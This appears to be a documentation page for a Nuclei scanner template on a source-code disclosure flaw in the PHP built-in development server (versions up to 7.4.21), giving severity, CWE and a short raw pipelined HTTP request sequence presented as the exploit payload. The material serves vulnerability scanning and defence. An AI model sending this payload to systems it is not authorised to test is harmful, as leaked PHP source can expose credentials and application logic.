# Nuclei Template: PHP Development Server <= 7.4.21 - Remote Source Disclosure
**Template ID:** php-src-diclosure
**Vulnerability Class:** Information Disclosure
**Severity:** High
**CWE:** CWE-540
**Source:** Nuclei Template (`php-src-disclosure.yaml`)

## Vulnerability Information & PoC

## Description
A source code disclosure vulnerability in a web server caused by improper handling of multiple requests in quick succession, leading to the server treating requested files as static files instead of executing scripts.

## Steps to reproduce / Exploit Payload
```http
GET /  HTTP/1.1
Host: {{Hostname}}

GET /{{rand_base(3)}}.{{rand_base(2)}} HTTP/1.1

GET /  HTTP/1.1
Host: {{Hostname}}
```

## References
- https://blog.projectdiscovery.io/php-http-server-source-disclosure/
